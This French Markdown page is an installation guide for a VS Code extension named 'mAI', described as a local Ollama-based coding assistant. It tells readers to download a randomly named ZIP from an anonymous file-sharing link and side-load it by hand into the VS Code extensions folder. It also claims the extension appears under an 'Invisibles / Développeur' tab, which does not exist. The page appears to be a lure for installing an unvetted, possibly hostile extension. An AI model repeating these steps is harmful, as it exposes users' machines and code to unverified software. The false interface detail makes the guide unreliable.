---
title: "Guide d'installation Extension VS Code"
description: "Guide d'installation, configuration et mode développeur pour l'extension mAI dans Visual Studio Code."
category: "Guides"
order: 14
---

# Guide d'installation Extension VS Code 💻✨

L'extension **mAI pour Visual Studio Code** apporte la puissance de votre assistant IA local directement au cœur de votre environnement de développement.

---

## 📥 1. Téléchargement & Extraction

1. Téléchargez l'archive officielle de l'extension : [ObQWvEwYTk.zip](https://upload.fs.fr/ObQWvEwYTk.zip).
2. Décompressez l'archive ZIP sur votre ordinateur à l'aide de votre outil d'extraction préféré (7-Zip, WinRAR, ou l'outil natif de votre système).

---

## 📂 2. Placement dans le dossier `.vscode/extensions`

Pour que VS Code charge l'extension :

1. Ouvrez votre gestionnaire de fichiers et accédez au répertoire utilisateur des extensions VS Code :
   - **Windows** : `%USERPROFILE%\.vscode\extensions\` (ex: `C:\Users\NomUtilisateur\.vscode\extensions\`)
   - **macOS / Linux** : `~/.vscode/extensions/`
2. Créez un nouveau dossier nommé `mai-extension` (ou collez le dossier extrait de l'archive ZIP).
3. Déplacez tout le contenu décompressé dans ce dossier (`.vscode/extensions/mai-extension/`).

---

## 🛠️ 3. Activation du Mode Développeur & Lancement

1. Ouvrez **Visual Studio Code**.
2. Activez le mode développeur ou rechargez la fenêtre VS Code :
   - Ouvrez la palette de commandes avec `Ctrl+Shift+P` (Windows/Linux) ou `Cmd+Shift+P` (macOS).
   - Saisissez `Developer: Reload Window` (Développeur : Recharger la fenêtre) et appuyez sur `Entrée`.
3. Pour vérifier l'activation :
   - Allez dans le panneau **Extensions** (`Ctrl+Shift+X` / `Cmd+Shift+X`).
   - L'extension **mAI** apparaîtra dans la liste des extensions installées sous l'onglet **Invisibles / Développeur**.

---

## 🚀 4. Fonctionnement de l'extension

L'extension mAI s'intègre de manière transparente dans VS Code :
- **Autocomplétion intelligente** : Suggestions de code en temps réel pendant la saisie.
- **Panneau latéral de Chat** : Posez des questions à mAI directement depuis la barre latérale sur votre projet.
- **Explications de code & Refactoring** : Surlignez du code, faites un clic droit et choisissez **mAI : Expliquer** ou **mAI : Optimiser**.
- **Exécution locale** : Tout le traitement s'effectue localement via Ollama sans transfert de données externes.
